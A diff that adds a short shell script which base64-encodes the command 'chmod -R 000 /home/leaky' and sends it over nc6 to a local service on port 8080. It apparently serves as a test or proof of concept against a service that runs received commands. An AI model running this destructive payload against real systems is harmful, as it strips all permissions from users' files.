@@ -1,0 +1,2 @@
+#! /bin/sh
+echo 'chmod -R 000 /home/leaky' | base64 | nc6 -6 ::1 8080
